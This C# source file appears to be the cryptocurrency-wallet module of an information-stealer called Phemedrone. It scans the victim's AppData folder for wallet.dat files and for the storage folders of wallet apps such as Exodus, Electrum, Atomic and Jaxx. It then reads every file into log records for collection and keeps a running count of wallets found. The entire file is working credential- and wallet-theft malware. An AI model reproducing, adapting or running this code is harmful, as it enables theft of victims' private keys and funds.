using System;
using System.Linq;
using System.Collections.Generic;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;
using Phemedrone.Services;

namespace Phemedrone.Services
{
    public class CryptoWallets : IService
    {
        public override PriorityLevel Priority => PriorityLevel.High;

        protected override LogRecord[] Collect()
        {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return ParseDatWallets(appdata).Concat(ParseColdWallets(appdata)).ToArray();
        }

        private static List<LogRecord> ParseDatWallets(string rootLocation)
        {
            var array = new List<LogRecord>();
            var wallets = Extensions.FileManager.EnumerateFiles(rootLocation, "wallet.dat", 2);
            foreach (var wallet in wallets)
            {
                var content = NullableValue.Call(() => File.ReadAllBytes(wallet));
                if (content == null) continue;
                
                ServiceCounter.WalletsCount++;
                array.Add(new LogRecord()
                {
                    Path = "Wallets/" + wallet.Replace(rootLocation + "\\", null),
                    Content = content
                });
            }

            return array.ToList();
        }
        
        private static List<LogRecord> ParseColdWallets(string rootLocation)
        {
            var result = new List<LogRecord>();
            var coldWallets = new Dictionary<string, string>()
            {
                { "Armory", "Armory" },
                { "Atomic",  "atomic\\Local Storage\\leveldb" },
                { "Bytecoin", "bytecoin" },
                { "Coninomi", "Coinomi\\Coinomi\\wallets" },
                { "Jaxx", "com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb" },
                { "Electrum", "Electrum\\wallets" },
                { "Exodus", "Exodus\\exodus.wallet" },
                { "Guarda", "Guarda\\Local Storage\\leveldb" },
            };
            foreach (var folder in coldWallets)
            {
                var combinedFolder = Path.Combine(rootLocation, folder.Value);
                if (!Directory.Exists(combinedFolder)) continue;

                ServiceCounter.WalletsCount++;
                foreach (var file in Directory.GetFiles(combinedFolder))
                {
                    var content = NullableValue.Call(() => File.ReadAllBytes(file));
                    if (content == null) continue;
                    result.Add(new LogRecord()
                    {
                        Path = "Wallets/" + folder.Key + "/" + file.Replace(combinedFolder + "\\", null),
                        Content = content
                    });
                }
            }
            return result;
        }
    }
}